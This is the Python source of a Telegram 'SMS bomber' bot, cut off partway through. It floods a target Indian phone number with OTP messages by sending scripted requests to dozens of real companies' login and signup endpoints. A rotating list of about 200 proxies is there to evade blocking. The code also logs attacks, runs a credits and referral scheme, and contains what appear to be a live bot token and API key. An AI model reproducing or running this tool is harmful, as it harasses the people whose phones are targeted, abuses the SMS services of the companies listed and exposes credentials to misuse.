import telebot
import requests
import time
import json
import os
import random
import threading
from datetime import datetime
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import hashlib

# ╔══════════════════════════════════════════════════════════════════╗
# ║         EXODUS BOMBER BOT — DARKNYTE EDITION                    ║
# ║         🇮🇳 INDIA SMS + 🔥 UNLIMITED BOMB MODE                ║
# ╚══════════════════════════════════════════════════════════════════╝

BOT_TOKEN       = "8683137209:AAHif3oTvCaNImIZCLKnKbOqi9N37a6Or-g"
bot             = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
BOT_USERNAME    = "contacttoanonymousbot"
OWNER_ID        = 8411182293
DEFAULT_ADMIN   = 8411182293
ADMIN_IDS       = [OWNER_ID, DEFAULT_ADMIN]

REQUIRED_CHANNELS = [
    {
        "name": "Main Channel",
        "url": "https://t.me/MASH0990n",
        "icon": "📢",
        "chat_id": -1003645958802,       # int — main13.py wala
        "type": "telegram_private"
    },

    {
        "name": "second channel",
        "url": "https://t.me/mash0990",
        "icon": "🗄️",
        "chat_id": -1003658332510,       # int — main13.py wala
        "type": "telegram_private"
    },

    }
]



MUST_JOIN_CHANNELS = REQUIRED_CHANNELS  # alias fix

DEVELOPER_USERNAME = "@contacttoanonymousbot"
DEVELOPER_FOOTER = (
    "\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
    "<b>⚡ Powered by ANONYMOUS s & Team</b>\n"
    f"<b>📞 Support: {DEVELOPER_USERNAME}</b>"
)

VPLINK_API_KEY  = "cae8232167ae3f6f5aa13a6f4125f1125123e43e"
VPLINK_BASE_URL = "https://vplink.in/api"

# ╔══════════════════════════════════════════════════════════════════╗
# ║              🌐 PROXY LIST — 200 PROXIES                        ║
# ╚══════════════════════════════════════════════════════════════════╝
PROXY_LIST = [
    "1.0.136.129:8080",
    "1.0.170.50:8080",
    "1.1.109.141:9999",
    "1.1.189.58:8080",
    "1.1.220.100:8080",
    "1.10.141.115:8080",
    "1.10.146.76:3128",
    "1.117.83.95:80",
    "1.179.147.5:52210",
    "1.179.148.33:1080",
    "1.179.148.9:36476",
    "1.179.148.9:55636",
    "1.179.172.45:31225",
    "1.179.199.130:33333",
    "1.179.231.130:8080",
    "1.180.0.162:7302",
    "1.180.49.222:7302",
    "1.2.252.65:8080",
    "1.20.169.102:8080",
    "1.212.157.114:4145",
    "1.234.153.14:80",
    "1.4.198.167:8080",
    "1.52.198.150:16000",
    "1.52.198.221:16000",
    "1.54.172.229:16000",
    "1.9.167.35:60489",
    "100.1.53.24:5678",
    "100.27.183.62:8080",
    "101.108.112.243:8080",
    "101.108.113.83:8080",
    "101.109.107.206:8080",
    "101.109.119.24:8080",
    "101.109.217.20:8080",
    "101.109.245.200:4153",
    "101.109.76.109:4145",
    "101.128.107.36:1111",
    "101.128.93.144:8090",
    "101.2.161.118:8080",
    "101.200.241.24:3128",
    "101.251.204.174:8080",
    "101.255.106.94:8080",
    "101.255.107.118:8080",
    "101.255.119.206:8080",
    "101.255.119.26:8080",
    "101.255.137.49:80",
    "101.255.138.82:80",
    "101.255.148.2:8080",
    "101.255.150.238:1080",
    "101.255.158.78:1111",
    "101.255.166.134:1111",
    "101.255.208.18:8090",
    "101.255.208.62:8080",
    "101.255.210.1:1111",
    "101.255.210.1:11116",
    "101.255.211.42:1111",
    "101.255.211.54:8082",
    "101.255.32.42:8080",
    "101.255.53.105:8080",
    "101.255.69.26:8080",
    "101.32.34.4:8118",
    "101.47.16.15:7890",
    "101.51.121.29:4153",
    "101.51.138.138:8080",
    "101.91.242.198:6688",
    "102.0.0.118:80",
    "102.0.16.226:8080",
    "102.0.17.164:8080",
    "102.0.18.120:8080",
    "102.0.18.198:8080",
    "102.0.21.156:8080",
    "102.0.8.23:8080",
    "102.0.9.114:8080",
    "102.135.142.234:12354",
    "102.135.195.90:8082",
    "102.141.30.2:33333",
    "102.164.215.88:8080",
    "102.164.220.243:8080",
    "102.164.252.150:8080",
    "102.165.125.102:5678",
    "102.177.176.0:80",
    "102.177.176.100:80",
    "102.177.176.101:80",
    "102.177.176.102:80",
    "102.177.176.103:80",
    "102.177.176.104:80",
    "102.177.176.105:80",
    "102.177.176.106:80",
    "102.177.176.107:80",
    "102.177.176.108:80",
    "102.177.176.109:80",
    "102.177.176.10:80",
    "102.177.176.110:80",
    "102.177.176.111:80",
    "102.177.176.112:80",
    "102.177.176.113:80",
    "102.177.176.114:80",
    "102.177.176.115:80",
    "102.177.176.116:80",
    "102.177.176.117:80",
    "102.177.176.118:80",
    "102.177.176.119:80",
    "102.177.176.11:80",
    "102.177.176.120:80",
    "102.177.176.121:80",
    "102.177.176.122:80",
    "102.177.176.123:80",
    "102.177.176.124:80",
    "102.177.176.125:80",
    "102.177.176.126:80",
    "102.177.176.127:80",
    "102.177.176.128:80",
    "102.177.176.129:80",
    "102.177.176.12:80",
    "102.177.176.130:80",
    "102.177.176.131:80",
    "102.177.176.132:80",
    "102.177.176.133:80",
    "102.177.176.134:80",
    "102.177.176.135:80",
    "102.177.176.136:80",
    "102.177.176.137:80",
    "102.177.176.138:80",
    "102.177.176.139:80",
    "102.177.176.13:80",
    "102.177.176.140:80",
    "102.177.176.141:80",
    "102.177.176.142:80",
    "102.177.176.143:80",
    "102.177.176.144:80",
    "102.177.176.145:80",
    "102.177.176.146:80",
    "102.177.176.147:80",
    "102.177.176.148:80",
    "102.177.176.149:80",
    "102.177.176.14:80",
    "102.177.176.150:80",
    "102.177.176.151:80",
    "102.177.176.152:80",
    "102.177.176.153:80",
    "102.177.176.154:80",
    "102.177.176.155:80",
    "102.177.176.156:80",
    "102.177.176.157:80",
    "102.177.176.158:80",
    "102.177.176.159:80",
    "102.177.176.15:80",
    "102.177.176.160:80",
    "102.177.176.161:80",
    "102.177.176.162:80",
    "102.177.176.163:80",
    "102.177.176.164:80",
    "102.177.176.165:80",
    "102.177.176.166:80",
    "102.177.176.167:80",
    "102.177.176.168:80",
    "102.177.176.169:80",
    "102.177.176.16:80",
    "102.177.176.170:80",
    "102.177.176.171:80",
    "102.177.176.172:80",
    "102.177.176.173:80",
    "102.177.176.174:80",
    "102.177.176.175:80",
    "102.177.176.176:80",
    "102.177.176.177:80",
    "102.177.176.178:80",
    "102.177.176.179:80",
    "102.177.176.17:80",
    "102.177.176.180:80",
    "102.177.176.181:80",
    "102.177.176.182:80",
    "102.177.176.183:80",
    "102.177.176.184:80",
    "102.177.176.185:80",
    "102.177.176.186:80",
    "102.177.176.187:80",
    "102.177.176.188:80",
    "102.177.176.189:80",
    "102.177.176.18:80",
    "102.177.176.190:80",
    "102.177.176.191:80",
    "102.177.176.192:80",
    "102.177.176.193:80",
    "102.177.176.194:80",
    "102.177.176.195:80",
    "102.177.176.196:80",
    "102.177.176.197:80",
    "102.177.176.198:80",
    "102.177.176.199:80",
    "102.177.176.19:80",
    "102.177.176.1:80",
    "102.177.176.200:80",
    "102.177.176.201:80",
    "102.177.176.202:80",
    "102.177.176.203:80",
    "102.177.176.204:80",
    "102.177.176.205:80",
    "102.177.176.206:80",
    "102.177.176.207:80",
]

# Proxy rotation state
_proxy_idx   = 0
_proxy_lock  = threading.Lock()
_dead_proxies = set()   # auto-blacklist failed proxies

def get_proxy():
    """Returns a live rotating proxy dict, or None if all dead / list empty."""
    global _proxy_idx
    if not PROXY_LIST:
        return None
    with _proxy_lock:
        tried = 0
        while tried < len(PROXY_LIST):
            p = PROXY_LIST[_proxy_idx % len(PROXY_LIST)]
            _proxy_idx += 1
            tried += 1
            if p not in _dead_proxies:
                return {"http": f"http://{p}", "https": f"http://{p}"}
    return None   # all proxies dead → go direct

# ===== DATABASE =====
DB_DIR = "db"
os.makedirs(DB_DIR, exist_ok=True)

def load_db(name, default):
    path = f"{DB_DIR}/{name}.json"
    if not os.path.exists(path):
        with open(path, "w") as f:
            json.dump(default, f)
    with open(path, "r") as f:
        return json.load(f)

def save_db(name, data):
    with open(f"{DB_DIR}/{name}.json", "w") as f:
        json.dump(data, f, indent=2)

users           = load_db("users", {})
credits         = load_db("credits", {})
referrals       = load_db("referrals", {})
referred_by     = load_db("referred_by", {})
shortener_links = load_db("shortener_links", {})
banned_users    = load_db("banned", [])
attack_logs     = load_db("attack_logs", {})

# ╔══════════════════════════════════════════════════════════════════╗
# ║  🇮🇳  INDIA SMS APIS — phone passed as 10-digit (FIXED)        ║
# ╚══════════════════════════════════════════════════════════════════╝
# NOTE: 'p' = 10-digit number e.g. "9876543210"
# APIs that need +91 prefix add it themselves inside the lambda.
INDIA_SMS_APIS = [
    {"name": "Lenskart",        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker",        "url": "https://www.nobroker.in/api/v3/account/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy",       "url": "https://pharmeasy.in/api/v2/auth/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Wakefit",         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Byjus",           "url": "https://api.byjus.com/v2/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Hungama",         "url": "https://communication.api.hungama.com/v1/communication/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "MeruCab",         "url": "https://merucabapp.com/api/otp/generate",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"mobile_number={p}"},
    {"name": "Doubtnut",        "url": "https://api.doubtnut.com/v4/student/login",
     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
     "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "PenPencil",       "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
     "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "Snitch",          "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "DaycoIndia",      "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "BeepKart",        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","city":362}}'},
    {"name": "LendingPlate",    "url": "https://lendingplate.com/api.php",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": lambda p: f"mobiles={p}&resend=Resend"},
    {"name": "BikeFixup",       "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
     "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "WellAcademy",     "url": "https://wellacademy.in/store/api/numberLoginV2",
     "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"},
     "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "ServeTel",        "url": "https://api.servetel.in/v1/auth/otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
     "data": lambda p: f"mobile_number={p}"},
    {"name": "GoPinkCabs",      "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "Shemaroome",      "url": "https://www.shemaroome.com/users/resend_otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "Cossouq",         "url": "https://www.cossouq.com/mobilelogin/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"mobilenumber={p}&otptype=register"},
    {"name": "MyImagineStore",  "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": lambda p: f"mobile={p}"},
    {"name": "Otpless",         "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'},
    {"name": "MyHubble",        "url": "https://api.myhubble.money/v1/auth/otp/generate",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
    {"name": "TataCapBiz",      "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare",       "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint",        "url": "https://api.snapmint.com/v1/public/sign_up",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "HousingCom",      "url": "https://login.housing.com/api/v2/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "RentoMojo",       "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Khatabook",       "url": "https://api.khatabook.com/v1/auth/request-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Netmeds",         "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa",           "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
    {"name": "RummyCircle",     "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name": "Animall",         "url": "https://animall.in/zap/auth/login",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "PenPencilV3",     "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Entri",           "url": "https://entri.app/api/v3/users/check-phone/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Cosmofeed",       "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
    {"name": "Aakash",          "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv",            "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
    {"name": "DeHaat",          "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
    {"name": "A23Games",        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name": "Spencers",        "url": "https://jiffy.spencers.in/user/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PayMeIndia",      "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "ShoppersStop",    "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "HyugaAuth",       "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "BigCash",
     "url": lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1",
     "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None},
    {"name": "LifestyleStores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
     "method": "POST", "headers": {"Content-Type": "ap
